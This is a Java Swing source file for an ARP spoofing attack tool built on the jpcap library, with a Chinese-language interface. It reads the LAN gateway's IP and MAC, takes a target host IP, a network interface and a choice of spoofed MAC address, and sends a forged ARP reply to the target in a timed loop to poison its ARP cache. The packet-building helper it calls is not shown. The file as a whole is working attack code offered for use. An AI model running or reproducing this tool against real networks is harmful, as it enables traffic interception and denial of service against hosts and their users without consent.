package ARPAttack;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.GridLayout;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.FocusEvent;
import java.awt.event.FocusListener;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.util.ArrayList;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.table.DefaultTableModel;

import org.jb2011.lnf.beautyeye.BeautyEyeLNFHelper;

import HandleJpcap.Jpcap;
import HandleJpcap.Packages;
import JFreeChart.Draw_RTT;
import MainFrame.MainFrame;
import Util.JDBC;
import Util.Statistic;
import jpcap.*;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.ICMPPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import jpcap.packet.UDPPacket;

import java.awt.FlowLayout;
import java.awt.GridBagLayout;
import java.awt.GridBagConstraints;
import java.awt.Insets;
import java.awt.CardLayout;

public class StartARPAttackFrame extends JFrame implements ActionListener, WindowListener {

	String GatewayIP;// 网关IP
	String GatewayMAC;// 网关IP
	boolean FLAG = false;// 同步锁
	boolean flag2 = true;// 开一次
	double[] RTT;// RTT

	int timmer = 5;

	// 界面有关变量
	JPanel jpl1 = new JPanel();
	JPanel jpl2 = new JPanel();
	ARPAttackTable table;
	JButton jbt_attack = new JButton("Attack");
	private final JButton jbt_pause = new JButton("Pause");
	private final JLabel jlb_host = new JLabel("    请输入要攻击主机的IP地址：");
	private final JLabel jlb_times = new JLabel("        请设置攻击时间间隔(s)：");
	private final JTextField jtf_times = new JTextField();
	private final JLabel jlb_interface = new JLabel("    请选择发送数据包的网卡：");
	private final JComboBox jcb_interface = new JComboBox();
	private final JLabel lblmac = new JLabel("        请选择伪装的MAC地址：");
	private final JComboBox jcb_mac = new JComboBox();
	private final JTextField jtf_host = new JTextField();

	public void GatewayQuery() {

		try {
			/*--------------	查询ARP表    --------------*/

			ArrayList<String> iPList = ARPQuery.ARPQuery();
			String boardcastAddress = BoardcastAddressQuery.BoardcastAddressQuery();//广播地址
			/*--------------	查询局域网网关    --------------*/
			GatewayIP = iPList.get(0).split("#")[0];
			GatewayMAC = iPList.get(0).split("#")[1];
			table.InsertRow("             局域网网关：" + GatewayIP);
			table.InsertRow("             广播地址：" + boardcastAddress);
			table.InsertRow("             本机IP地址：" + InetAddress.getLocalHost().getHostAddress());
			table.InsertRow("");

			/*--------------	查询局域网其他设备IP-MAC    --------------*/
			table.InsertRow("             已捕获到局域网内IP-MAC" + '\n');
			for (int i = 0; i < iPList.size(); i++) {
				table.InsertRow(
						(i + 1) + ".  IP: " + iPList.get(i).split("#")[0] + "    MAC: " + iPList.get(i).split("#")[1]);
			}

			table.InsertRow("");
			table.InsertRow(" 也可以自己输入IP，但必须在同一个局域网内");

		} catch (Exception e1) {
			JOptionPane.showMessageDialog(this, "请检查网络连接");
			e1.printStackTrace();
		}
	}

	public StartARPAttackFrame() {
		jtf_host.setColumns(10);

		this.setTitle("ARP攻击");
		this.setResizable(false);
		this.setSize(1040, 476);
		getContentPane().setLayout(new BorderLayout(0, 0));
		getContentPane().add(jpl1, BorderLayout.NORTH);
		jpl1.setLayout(new GridLayout(0, 5, 10, 3));

		jpl1.add(jlb_interface);

		jpl1.add(jcb_interface);

		jpl1.add(lblmac);

		jpl1.add(jcb_mac);

		jpl1.add(jbt_attack);

		jbt_attack.addActionListener(this);

		jpl1.add(jlb_host);

		jpl1.add(jtf_host);

		jpl1.add(jlb_times);

		jpl1.add(jtf_times);

		jpl1.add(jbt_pause);
		jbt_pause.addActionListener(this);

		jcb_interface.addItem("Wi-Fi：en0");
		jcb_interface.addItem("Thunderbolt Bridge：bridge0");
		jcb_interface.addItem("Thunderbolt：en1");
		jcb_interface.addItem("Apple-USB：en5");
		jcb_interface.addItem("bridge100");
		jcb_interface.addItem("Loopback：lo0");


		jcb_mac.addItem("本机MAC地址");
		jcb_mac.addItem("随机MAC地址 1");
		jcb_mac.addItem("随机MAC地址 2");

		getContentPane().add(jpl2, BorderLayout.CENTER);
		jpl2.setLayout(new BorderLayout(0, 0));

		table = new ARPAttackTable();
		table.setOpaque(true);
		jpl2.add(table);

		GatewayQuery();

		this.setLocation(200, 130);
		this.setVisible(true);

		this.addWindowListener(this);

	}

	@Override
	public void actionPerformed(ActionEvent e) {

		if (e.getSource() == jbt_attack) {
			String host;// 访问网站
			double times;// 访问次数
			int macFlag;// MAC选择

			/*--------------	 是否未终止上一次攻击       --------------*/
			if (FLAG == true) {
				JOptionPane.showMessageDialog(this, "请先停止攻击");
				return;
			}

			/*--------------	 是否有选项未填       --------------*/
			if (jtf_host.getText() == null || jtf_times.getText() == null || jtf_host.getText() == ""
					|| jtf_times.getText() == "" || jtf_host.getText().equals("") || jtf_times.getText().equals("")) {
				JOptionPane.showMessageDialog(null, "请输入IP和攻击间隔");
				return;
			}

			/*--------------	 格式是否正确       --------------*/
			try {
				times = Double.parseDouble(jtf_times.getText());
			} catch (Exception e1) {
				JOptionPane.showMessageDialog(null, "攻击间隔必须为数字");
				return;

			}

			/*--------------	绑定网络设备       --------------*/
			NetworkInterface[] devices = JpcapCaptor.getDeviceList();
			NetworkInterface device = devices[jcb_interface.getSelectedIndex()];

			/*--------------	MAC地址选择    --------------*/
			if (jcb_mac.getSelectedIndex() == 0) {
				macFlag = 0;
			} else if (jcb_mac.getSelectedIndex() == 1) {
				macFlag = 1;
			} else {
				macFlag = 2;
			}

			/*--------------	IP地址选择    --------------*/
			host = jtf_host.getText();

			/*--------------	清空列表    --------------*/
			table.DeleteAll();

			/*--------------	参数调整       --------------*/

			// 1.需要监听的网卡
			// 2.每次捕获的数据包最大长度（设置为IP包最大长度即可）
			// 3.过滤（Mac地址不是当前网卡的IP数据包）
			// 4.超时时间
			try {
				this.setTitle("ARP攻击  (目标主机MAC地址获取中)");
				JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535, false, 3000);
				jpcap.setFilter("arp", true);
				JpcapSender sender = JpcapSender.openDevice(device);// 发送器JpcapSender，用来发送报文

				ARPPacket arp = ARPAttack.ARPAttack(GatewayIP,GatewayMAC, host, macFlag, device);
				if (arp == null) {
					JOptionPane.showMessageDialog(this, "攻击失败：请检查IP地址是否为局域网IP");
					this.setTitle("ARP攻击  (失败)");
					GatewayQuery();
					return;
				} else {
					table.InsertRow("              成功获取目标主机MAC地址");
					table.InsertRow("                       APR攻击开始");
					table.InsertRow("           ");
				}
				FLAG = true;// 继续
				this.setTitle("ARP攻击  (攻击中)");
				new Thread() {
					public void run() {
						try {
							// 发送ARP应答包 。
							// 因为一般主机会间隔一定时间发送ARP请求包询问网关地址
							// 所以这里需要设置一个攻击周期。

							while (FLAG) {

								sender.sendPacket(arp);
								timmer++;
								if (timmer > 5) {
									table.InsertRow("                    ARP攻击包已发送");
									timmer = 0;
								}

								Thread.sleep((int) times * 1000);
							}

						}

						catch (Exception e1) {
							JOptionPane.showMessageDialog(null, "出现异常：" + '\n' + e1.toString());
							return;
						}
					};
				}.start();

			} catch (Exception e2) {
				JOptionPane.showMessageDialog(null, "出现异常：" + '\n' + e2.toString());
				return;
			}

		}

		if (e.getSource() == jbt_pause) {
			this.setTitle("ARP攻击  (暂停)");
			FLAG = false;// 暂停
		}

	}

	@Override
	public void windowOpened(WindowEvent e) {
		// TODO Auto-generated method stub

	}

	@Override
	public void windowClosing(WindowEvent e) {

		new MainFrame();
	}

	@Override
	public void windowClosed(WindowEvent e) {

	}

	@Override
	public void windowIconified(WindowEvent e) {
		// TODO Auto-generated method stub

	}

	@Override
	public void windowDeiconified(WindowEvent e) {
		// TODO Auto-generated method stub

	}

	@Override
	public void windowActivated(WindowEvent e) {
		// TODO Auto-generated method stub

	}

	@Override
	public void windowDeactivated(WindowEvent e) {
		// TODO Auto-generated method stub

	}

	public static void main(String[] args) {

		new StartARPAttackFrame();
	}

}
